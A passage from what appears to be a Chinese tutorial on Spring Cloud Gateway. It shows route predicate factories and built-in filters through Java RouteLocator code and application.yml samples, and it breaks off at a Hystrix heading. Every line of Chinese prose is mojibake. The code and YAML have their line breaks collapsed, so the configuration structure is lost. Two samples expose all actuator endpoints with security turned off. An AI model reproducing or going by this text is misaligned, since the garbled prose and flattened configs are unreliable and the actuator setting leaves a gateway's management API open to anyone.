é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ å¼€å¯ç«¯ç‚¹çš„é…ç½®ä¿¡æ¯ï¼ŒSpring Cloud Gateway æä¾›äº†ä¸€ä¸ª Gateway Actuatorï¼Œè¯¥ EndPiont æä¾›äº†å…³äº Filter åŠ Routes çš„ä¿¡æ¯æŸ¥è¯¢ä»¥åŠæŒ‡å®š Route ä¿¡æ¯æ›´æ–°çš„ Rest API æ¥å£ï¼š 123456789101112131415161718192021server: port: 9090spring: application: name: gateway-serverlogging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 4. åˆ›å»º Gateway YML å·¥ç¨‹Spring Cloud Gateway æ”¯æŒä¸¤ç§æ–¹å¼å»é…ç½®è·¯ç”±ä¿¡æ¯ï¼Œä¸Šè¿°ä»£ç é€šè¿‡ Java æµå¼ API è‡ªå®šä¹‰ RouteLocator çš„æ–¹å¼å®šä¹‰ Spring Cloud Gateway çš„è·¯ç”±ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹ YML æ–‡ä»¶çš„æ–¹å¼é…ç½®è·¯ç”±ã€‚ åˆ›å»º Gateway YML çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt;&lt;/dependency&gt; åˆ›å»º Gateway YML çš„ä¸»æ§åˆ¶ç±»ï¼š 1234567@SpringBootApplicationpublic class GatewayApplication { public static void main(String[] args) { SpringApplication.run(GatewayApplication.class, args); }} åˆ›å»º Gateway YML çš„ application.yml é…ç½®æ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728server: port: 9091spring: application: name: gateway-server cloud: gateway: routes: #å½“è®¿é—®åˆ° http://127.0.0.1:9090/baidu ç›´æ¥è·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ - id: baidu_route uri: http://baidu.com:80/ predicates: - Path=/baidulogging: level: org.springframework.cloud.gateway: TRACE org.springframework.http.server.reactive: DEBUG org.springframework.web.reactive: DEBUG reactor.ipc.netty: DEBUGmanagement: endpoints: web: exposure: include: \'*\' security: enabled: false 5. æµ‹è¯•ç»“æœ åˆ†åˆ«å¯åŠ¨ gatewayã€gateway-yml åº”ç”¨ è®¿é—® http://127.0.0.1:9090/actuator/gateway/routesï¼ŒæŸ¥çœ‹è¿”å›çš„æ‰€æœ‰è·¯ç”±ä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è®¿é—® http://127.0.0.1:9090/jdï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸè·³è½¬åˆ°äº¬ä¸œå•†åŸçš„é¦–é¡µ è®¿é—® http://127.0.0.1:9091/baiduï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸè·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ Spring Cloud Gateway çš„è·¯ç”±æ–­è¨€Spring Cloud Gateway çš„è·¯ç”±åŒ¹é…çš„åŠŸèƒ½æ˜¯ä»¥ Spring WebFlux ä¸­çš„ Handler Mapping ä¸ºåŸºç¡€å®ç°çš„ã€‚Spring Cloud Gateway ä¹Ÿæ˜¯ç”±è®¸å¤šçš„è·¯ç”±æ–­è¨€å·¥å‚ç»„æˆçš„ï¼Œå½“ Http Request è¯·æ±‚è¿›å…¥ Spring Cloud Gateway çš„æ—¶å€™ï¼Œç½‘å…³ä¸­çš„è·¯ç”±æ–­è¨€å·¥å‚ä¼šæ ¹æ®é…ç½®çš„è·¯ç”±è§„åˆ™ï¼Œå¯¹ Http Request è¯·æ±‚è¿›è¡Œæ–­è¨€åŒ¹é…ï¼›åŒ¹é…æˆåŠŸåˆ™è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†ï¼Œå¦åˆ™æ–­è¨€å¤±è´¥ç›´æ¥è¿”å›é”™è¯¯ä¿¡æ¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒSpring Cloud Gateway å¤§å¤šæ•°çš„è·¯ç”±æ–­è¨€å·¥å‚æ˜¯æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„ã€‚ä¸‹é¢å°†ç»™å‡ºå„ç§è·¯ç”±æ–­è¨€å·¥å‚çš„ä½¿ç”¨ç¤ºä¾‹ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ After è·¯ç”±æ–­è¨€å·¥å‚After è·¯ç”±æ–­è¨€å·¥å‚ä¸­ä¼šå–ä¸€ä¸ª UTC æ—¶é—´æ ¼å¼çš„æ—¶é—´å‚æ•°ï¼Œå½“è¯·æ±‚è¿›æ¥çš„å½“å‰æ—¶é—´åœ¨é…ç½®çš„ UTC æ—¶é—´ä¹‹åï¼Œåˆ™ä¼šæˆåŠŸåŒ¹é…ï¼Œå¦åˆ™ä¸èƒ½æˆåŠŸåŒ¹é…ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† After è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // ç”Ÿæˆæ¯”å½“å‰æ—¶é—´æ—©ä¸€ä¸ªå°æ—¶çš„UTCæ—¶é—´ ZonedDateTime minusTime = LocalDateTime.now().minusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "after_route", r -&gt; r.after(minusTime).uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® After è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼šå…¶ä¸­çš„ UTC æ—¶é—´å¯ä»¥ä½¿ç”¨ Java ä»£ç ç”Ÿæˆï¼Œä¾‹å¦‚ ZonedDateTime.now().minusHours(1).format(DateTimeFormatter.ISO_ ZONED_DATE_TIME); 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: after_route uri: http://baidu.com predicates: - After=2019-10-01T21:55:18.146+08:00[Asia/Shanghai] æµ‹è¯•ç»“æœï¼š å¯åŠ¨åº”ç”¨ï¼Œè®¿é—® http://127.0.0.1ï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸè·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ æ›´æ”¹ UTC æ—¶é—´ä¸ºå½“å‰æ—¶é—´ä¸€ä¸ªå°æ—¶åçš„ UTC æ—¶é—´ï¼Œç„¶åå†å¯åŠ¨åº”ç”¨ï¼Œè®¿é—® http://127.0.0.1ï¼Œé¡µé¢ä¼šè¿”å› 404 é”™è¯¯ä¿¡æ¯ Before è·¯ç”±æ–­è¨€å·¥å‚Before è·¯ç”±æ–­è¨€å·¥å‚ä¼šå–ä¸€ä¸ª UTC æ—¶é—´æ ¼å¼çš„æ—¶é—´å‚æ•°ï¼Œå½“è¯·æ±‚è¿›æ¥çš„å½“å‰æ—¶é—´åœ¨é…ç½®çš„ UTC æ—¶é—´ä¹‹å‰ï¼Œåˆ™ä¼šæˆåŠŸåŒ¹é…ï¼Œå¦åˆ™ä¸èƒ½æˆåŠŸåŒ¹é…ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Before è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { // ç”Ÿæˆæ¯”å½“å‰æ—¶é—´æ™šä¸€ä¸ªå°æ—¶çš„UTCæ—¶é—´ ZonedDateTime plusTime = LocalDateTime.now().plusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "before_route", r -&gt; r.before(plusTime).uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Before è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: before_route uri: http://baidu.com predicates: - Before=2019-10-01T21:55:18.146+08:00[Asia/Shanghai] Between è·¯ç”±æ–­è¨€å·¥å‚Between è·¯ç”±æ–­è¨€å·¥å‚ä¼šå–ä¸€ä¸ª UTC æ—¶é—´æ ¼å¼çš„æ—¶é—´å‚æ•°ï¼Œå½“è¯·æ±‚è¿›æ¥çš„å½“å‰æ—¶é—´åœ¨é…ç½®çš„ UTC æ—¶é—´ä¹‹é—´ï¼Œåˆ™ä¼šæˆåŠŸåŒ¹é…ï¼Œå¦åˆ™ä¸èƒ½æˆåŠŸåŒ¹é…ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Between è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 1234567891011121314@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { ZonedDateTime minusTime = LocalDateTime.now().minusHours(1).atZone(ZoneId.systemDefault()); ZonedDateTime plusTime = LocalDateTime.now().plusHours(1).atZone(ZoneId.systemDefault()); return builder.routes() .route( "between_route", r -&gt; r.between(minusTime, plusTime).uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Between è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: between_route uri: http://baidu.com predicates: - Between=2019-11-10T11:11:11.111 08:00[Asia/Shanghai], 2019-11-12T11:11:11.111 08:00[Asia/Shanghai] Cookie è·¯ç”±æ–­è¨€å·¥å‚Cookie è·¯ç”±æ–­è¨€å·¥å‚ä¼šå–ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ cookie åç§°å¯¹åº”çš„ key å’Œ valueã€‚å½“è¯·æ±‚ä¸­æºå¸¦çš„ cookie å’Œ Cookie æ–­è¨€å·¥å‚ä¸­é…ç½®çš„ cookie ä¸€è‡´ï¼Œåˆ™è·¯ç”±åŒ¹é…æˆåŠŸï¼Œå¦åˆ™åŒ¹é…ä¸æˆåŠŸã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Cookie è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "cookie_route", r -&gt; r.cookie("book", "java").uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Cookie è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: cookie_route uri: http://baidu.com predicates: - Cookie=book, java æµ‹è¯•ç»“æœ å¯åŠ¨ gateway-cookie åº”ç”¨ åœ¨ Postman ä¸­å°† book=java æ·»åŠ åˆ° Cookieï¼Œç„¶åè®¿é—® http://127.0.0.1ï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸè·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ Header è·¯ç”±æ–­è¨€å·¥å‚Header è·¯ç”±æ–­è¨€å·¥å‚ç”¨äºæ ¹æ®é…ç½®çš„è·¯ç”± header ä¿¡æ¯è¿›è¡Œæ–­è¨€åŒ¹é…è·¯ç”±ï¼ŒåŒ¹é…æˆåŠŸè¿›è¡Œè½¬å‘ï¼Œå¦åˆ™ä¸è¿›è¡Œè½¬å‘ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Header è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "header_route", r -&gt; r.header("X-Request-Id", "Peter").uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Header è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: header_route uri: http://baidu.com predicates: - Header=X-Request-Id, Peter æµ‹è¯•ç»“æœ å¯åŠ¨ gateway-header åº”ç”¨ åœ¨ Postman ä¸­å°† X-Request-Id=Peter æ·»åŠ åˆ° Headerï¼Œç„¶åè®¿é—® http://127.0.0.1ï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸè·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ Host è·¯ç”±æ–­è¨€å·¥å‚Host è·¯ç”±æ–­è¨€å·¥å‚æ ¹æ®é…ç½®çš„ Hostï¼Œå¯¹è¯·æ±‚ä¸­çš„ Host è¿›è¡Œæ–­è¨€å¤„ç†ï¼Œæ–­è¨€æˆåŠŸåˆ™è¿›è¡Œè·¯ç”±è½¬å‘ï¼Œå¦åˆ™ä¸è½¬å‘ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Host è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "host_route", r -&gt; r.host("**.study.com").uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Host è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: host_route uri: http://baidu.com predicates: - Host=**.study.com æµ‹è¯•ç»“æœ ç¼–è¾‘ç³»ç»Ÿçš„ hosts é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ åŸŸåæ˜ å°„ï¼š127.0.0.1 www.study.com å¯åŠ¨ gateway-host åº”ç”¨ è®¿é—® http://www.study.comï¼ŒæŸ¥çœ‹æ˜¯å¦æˆåŠŸè·³è½¬åˆ°ç™¾åº¦çš„é¦–é¡µ Method è·¯ç”±æ–­è¨€å·¥å‚Method è·¯ç”±æ–­è¨€å·¥å‚ä¼šæ ¹æ®è·¯ç”±ä¿¡æ¯é…ç½®çš„ method å¯¹è¯·æ±‚æ–¹æ³•æ˜¯ Get æˆ–è€… Post ç­‰è¿›è¡Œæ–­è¨€åŒ¹é…ï¼ŒåŒ¹é…æˆåŠŸåˆ™è¿›è¡Œè½¬å‘ï¼Œå¦åˆ™å¤„ç†å¤±è´¥ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Method è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "method_route", r -&gt; r.method("GET").uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Method è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: method_route uri: http://baidu.com predicates: - Method=GET Query è·¯ç”±æ–­è¨€å·¥å‚Query è·¯ç”±æ–­è¨€å·¥å‚ä¼šä»è¯·æ±‚ä¸­è·å–ä¸¤ä¸ªå‚æ•°ï¼Œå°†è¯·æ±‚ä¸­å‚æ•°å’Œ Query æ–­è¨€è·¯ç”±ä¸­çš„é…ç½®è¿›è¡ŒåŒ¹é…ï¼Œæ¯”å¦‚ http://127.0.0.1?book=java ä¸­çš„ book=java å’Œä¸‹é¢çš„ r.query("book","java") é…ç½®ä¸€è‡´ï¼Œåˆ™è½¬å‘æˆåŠŸï¼Œå¦åˆ™è½¬å‘å¤±è´¥ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Query è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "query_route", r -&gt; r.query("book", "java").uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Query è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: query_route uri: http://baidu.com predicates: - Query=book, java Path è·¯ç”±æ–­è¨€å·¥å‚Path è·¯ç”±æ–­è¨€å·¥å‚æ¥æ”¶ä¸€ä¸ªå‚æ•°ï¼Œæ ¹æ® Path å®šä¹‰å¥½çš„è§„åˆ™æ¥åˆ¤æ–­è®¿é—®çš„ URI æ˜¯å¦åŒ¹é…ã€‚åœ¨ä¸‹è¿°é…ç½®ä¸­ï¼Œå¦‚æœè¯·æ±‚è·¯å¾„ä¸º /blog/detail/ï¼Œåˆ™æ­¤è·¯ç”±å°†åŒ¹é…ï¼›ä¹Ÿå¯ä»¥ä½¿ç”¨è¡¨è¾¾å¼ï¼Œä¾‹å¦‚ /blog/detail/** è¡¨ç¤ºåŒ¹é… /blog/detail/ å¼€å¤´çš„å¤šçº§ URIã€‚ç‰¹åˆ«æ³¨æ„ï¼Œä¸‹è¿°çš„ URI å¦‚æœä¸ä»¥ / ç»“å°¾ï¼Œé‚£ä¹ˆè½¬å‘åçš„ URI ä¸º http://baidu.com/blog/detail/ï¼›è‹¥ä»¥ / ç»“å°¾ï¼Œè½¬å‘åçš„ URI åˆ™ä¸º http://baidu.com/ã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† Path è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "path_route", r -&gt; r.path("/blog/detail/").uri("http://baidu.com/") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® Path è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: path_route uri: http://baidu.com/ predicates: - Path=/blog/detail/ Weight è·¯ç”±æ–­è¨€å·¥å‚Weight è·¯ç”±æ–­è¨€å·¥å‚ï¼Œåœ¨ Spring Cloud Gateway ä¸­å¯ä»¥ä½¿ç”¨å®ƒå¯¹ URL è¿›è¡Œæƒé‡è·¯ç”±ï¼Œåªéœ€åœ¨é…ç½®æ—¶æŒ‡å®šåˆ†ç»„å’Œæƒé‡å€¼å³å¯ã€‚ä¸‹è¿°é…ç½®ä¸­ï¼Œæ·»åŠ äº†ä¸¤ä¸ªé’ˆå¯¹ /test è·¯å¾„è½¬å‘çš„è·¯ç”±å®šä¹‰é…ç½®ï¼Œè¿™ä¸¤ä¸ªè·¯ç”±å±äºåŒä¸€ä¸ªæƒé‡åˆ†ç»„ï¼Œæƒé‡çš„åˆ†ç»„åç§°ä¸º groupã€‚æœ€ç»ˆçš„æ•ˆæœæ˜¯æŠŠ /test æ¥å£çš„ 95% çš„è¯·æ±‚æµé‡åˆ†å‘ç»™æœåŠ¡çš„ V1 ç‰ˆæœ¬ï¼ŒæŠŠå‰©ä½™ 5% çš„æµé‡åˆ†å‘ç»™æœåŠ¡çš„ V2 ç‰ˆæœ¬ï¼Œå…·ä½“çš„å®æˆ˜æ¡ˆä¾‹å¯å‚è€ƒè¿™é‡Œçš„æ•™ç¨‹ã€‚ 12345678910111213141516spring: application: name: gateway-server cloud: gateway: routes: - id: provider-service-v1 uri: http://127.0.0.1:9091/v1/ predicates: - Path=/test - Weight=group, 95 - id: provider-service-v2 uri: http://127.0.0.1:9091/v2/ predicates: - Path=/test - Weight=group, 5 RemoteAddr è·¯ç”±æ–­è¨€å·¥å‚RemoteAddr è·¯ç”±æ–­è¨€å·¥å‚é…ç½®ä¸€ä¸ª IPv4 æˆ– IPv6 ç½‘æ®µçš„å­—ç¬¦ä¸²æˆ–è€… IPã€‚å½“å®¢æˆ·ç«¯çš„ IP åœ°å€åœ¨ç½‘æ®µä¹‹å†…æˆ–è€…å’Œé…ç½®çš„ IP ç›¸åŒï¼Œåˆ™æˆåŠŸè½¬å‘ï¼Œå¦åˆ™ä¸èƒ½è½¬å‘ã€‚ä¾‹å¦‚ 192.168.0.1/16 è¡¨ç¤ºä¸€ä¸ªç½‘æ®µï¼Œå…¶ä¸­ 192.168.0.1 æ˜¯ IP åœ°å€ï¼Œ16 æ˜¯å­ç½‘æ©ç ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ç›´æ¥é…ç½®ä¸€ä¸ª IPã€‚ é€šè¿‡ Java ä»£ç çš„æ–¹å¼ï¼Œå°† RemoteAddr è·¯ç”±æ–­è¨€çš„é…ç½®ä¿¡æ¯é…ç½®åˆ°è·¯ç”±é‡Œå»ï¼š 123456789101112@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route( "remoteaddr_route", r -&gt; r.remoteAddr("127.0.0.1").uri("http://baidu.com") ) .build(); }} ä¹Ÿå¯ä»¥åœ¨ application.yml æ–‡ä»¶é‡Œé…ç½® RemoteAddr è·¯ç”±æ–­è¨€ä¿¡æ¯ï¼š 12345678910spring: application: name: gateway-server cloud: gateway: routes: - id: remoteaddr_route uri: http://baidu.com predicates: - RemoteAddr=127.0.0.1 Spring Cloud Gateway çš„å†…ç½® FilterSpring Cloud Gateway ä¸­å†…ç½®å¾ˆå¤šçš„è·¯ç”±è¿‡æ»¤å·¥å‚ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥æ ¹æ®å®é™…åº”ç”¨åœºæ™¯çš„éœ€è¦å®šåˆ¶è‡ªå·±çš„è·¯ç”±è¿‡æ»¤å™¨å·¥å‚ã€‚è·¯ç”±è¿‡æ»¤å™¨å…è®¸ä»¥æŸç§æ–¹å¼ä¿®æ”¹è¿›æ¥çš„ HTTP è¯·æ±‚æˆ–è¿”å›çš„ HTTP å“åº”ã€‚è·¯ç”±è¿‡æ»¤å™¨ä¸»è¦ä½œç”¨äºéœ€è¦å¤„ç†çš„ç‰¹å®šè·¯ç”±ï¼ŒSpring Cloud Gateway æä¾›äº†å¾ˆå¤šç§çš„è¿‡æ»¤å™¨å·¥å‚ï¼Œè¿‡æ»¤å™¨çš„å®ç°ç±»å°†è¿‘äºŒåå¤šä¸ªã€‚æ€»å¾—æ¥è¯´ï¼Œå¯ä»¥åˆ†ä¸ºä¸ƒç±»ï¼šHeaderã€Parameterã€Pathã€Statusã€Redirect è·³è½¬ã€Hytrix ç†”æ–­å’Œ RateLimiter é™æµã€‚ä¸‹é¢å°†ä»‹ç» Spring Cloud Gateway ä¸­å¸¸ç”¨çš„ Filter å·¥å‚ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç ã€‚ AddRequestHeader è¿‡æ»¤å™¨AddRequestHeader è¿‡æ»¤å™¨å·¥å‚ç”¨äºå¯¹åŒ¹é…ä¸Šçš„è¯·æ±‚åŠ ä¸Š Headerï¼š 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_request_header_route", r -&gt; r.path("/addRequestHeader") .filters(f -&gt; f.addRequestHeader("X-Request-Id", "Peter")) .uri("http://127.0.0.1:8080/addRequestHeader/") ).build(); }} AddRequestParameter è¿‡æ»¤å™¨AddRequestParameter è¿‡æ»¤å™¨ä½œç”¨æ˜¯å¯¹åŒ¹é…ä¸Šçš„è¯·æ±‚æ·»åŠ è¯·æ±‚å‚æ•°ï¼š 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_request_parameter_route", r -&gt; r.path("/addRequestParameter") .filters(f -&gt; f.addRequestParameter("book", "java")) .uri("http://127.0.0.1:8080/addRequestParameter/") ).build(); }} RewritePath è¿‡æ»¤å™¨Spring Cloud Gateway å¯ä»¥ä½¿ç”¨ RewritePath æ›¿æ¢ Zuul çš„ StripPrefix åŠŸèƒ½ï¼Œè€Œä¸”åŠŸèƒ½æ›´å¼ºå¤§ã€‚åœ¨ Zuul ä¸­ä½¿ç”¨å¦‚ä¸‹é…ç½®åï¼Œæ‰€æœ‰ /example/xxxx çš„è¯·æ±‚ä¼šè½¬å‘ç»™ http://example.com/xxxxï¼ŒåŒæ—¶å»é™¤æ‰äº† example å‰ç¼€ã€‚ 123456zuul: routes: example: path: /example/** stripPrefix: true uri: http://example.com Spring Cloud Gateway å®ç°äº†ç±»ä¼¼çš„åŠŸèƒ½ï¼Œä½¿ç”¨çš„æ˜¯ RewritePath è¿‡æ»¤å™¨å·¥å‚ã€‚ç‰¹åˆ«æ³¨æ„ï¼Œä¸‹è¿°çš„ URI æ˜¯ä¸ä»¥ / ç»“å°¾çš„ï¼Œå¦åˆ™ä»…ä»…ä¼šç›´æ¥è·³è½¬åˆ° http://baidu.comã€‚ 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("rewrite_path_route", r -&gt; r.path("/foo/**") .filters(f -&gt; f.rewritePath("/foo/(?&lt;segment&gt;.*)", "/$\\\\{segment}")) .uri("http://www.baidu.com") ).build(); }} å¯åŠ¨å¯¹åº”çš„åº”ç”¨åï¼Œè®¿é—® http://127.0.0.1:9092/foo/cache/sethelp/help.htmlï¼Œè·¯ç”±ä¼šè½¬å‘åˆ° http://www.baidu.com/cache/sethelp/help.htmlï¼Œè¿™é‡Œç›¸å½“äºæŠŠ foo å‰ç¼€å»æ‰ã€‚ AddResponseHeader è¿‡æ»¤å™¨AddResponseHeader è¿‡æ»¤å™¨å·¥å‚çš„ä½œç”¨æ˜¯å¯¹ä»ç½‘å…³è¿”å›çš„å“åº”æ·»åŠ  Headerï¼š 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("add_response_header_route", r -&gt; r.path("/addResponseHeader") .filters(f -&gt; f.addResponseHeader("X-Request-Id", "Peter")) .uri("http://www.baidu.com/") ).build(); }} StripPrefix è¿‡æ»¤å™¨StripPrefixGatewayFilterFactory æ˜¯ä¸€ä¸ªå¯¹é’ˆå¯¹è¯·æ±‚ URL å‰ç¼€è¿›è¡Œå¤„ç†çš„ Filter å·¥å‚ï¼Œç”¨äºå»é™¤å‰ç¼€ï¼Œè€Œ PrefixPathGatewayFilterFactory æ˜¯ç”¨äºå¢åŠ å‰ç¼€ã€‚ä¸‹è¿°çš„é…ç½®ï¼Œè®¿é—® http://127.0.0.1:9093/baidu/testï¼Œä¼šè·³è½¬åˆ° https://www.baidu.comï¼Œå³å»é™¤äº†å‰ç¼€ /baidu/test/ã€‚ 123456789101112spring: application: name: gateway-server cloud: gateway: routes: - id: baidu_route uri: http://www.baidu.com predicates: - Path=/baidu/test/** filters: - StripPrefix=2 Retry è¿‡æ»¤å™¨ç½‘å…³ä½œä¸ºæ‰€æœ‰è¯·æ±‚æµé‡çš„å…¥å£ï¼Œç½‘å…³å¯¹è·¯ç”±è¿›è¡Œåè®®é€‚é…å’Œåè®®è½¬å‘å¤„ç†çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‡ºç°å¼‚å¸¸æˆ–ç½‘ç»œæŠ–åŠ¨ï¼Œä¸ºäº†ä¿è¯åç«¯æœåŠ¡è¯·æ±‚çš„é«˜å¯ç”¨ï¼Œä¸€èˆ¬å¤„ç†æ–¹å¼ä¼šå¯¹ç½‘ç»œè¯·æ±‚è¿›è¡Œé‡è¯•ï¼Œæ¥å£å¿…é¡»éœ€è¦åšå¹‚ç­‰å¤„ç†ã€‚config.setRetries(2).setStatuses(HttpStatus.INTERNAL_SERVER_ERROR) è¡¨ç¤ºè®¾ç½®é‡è¯•æ¬¡æ•°ä¸ºä¸¤æ¬¡ï¼Œå½“æœåŠ¡è°ƒç”¨å¤±è´¥æ—¶è®¾ç½®è¿”å›çš„çŠ¶æ€ç ä¸º 500ï¼Œå³æœåŠ¡å™¨å†…éƒ¨é”™è¯¯ã€‚ 12345678910111213@Configurationpublic class CommonConfiguration { @Bean public RouteLocator routeLocator(RouteLocatorBuilder builder) { return builder.routes() .route("retry_route", r -&gt; r.path("/test/retry") .filters(f -&gt; f.retry(config -&gt; config.setRetries(2) .setStatuses(HttpStatus.INTERNAL_SERVER_ERROR))) .uri("http://127.0.0.1:8080/retry?key=abc&amp;count=2")) .build(); }} Hystrix è¿‡æ»¤å™¨Hystrix 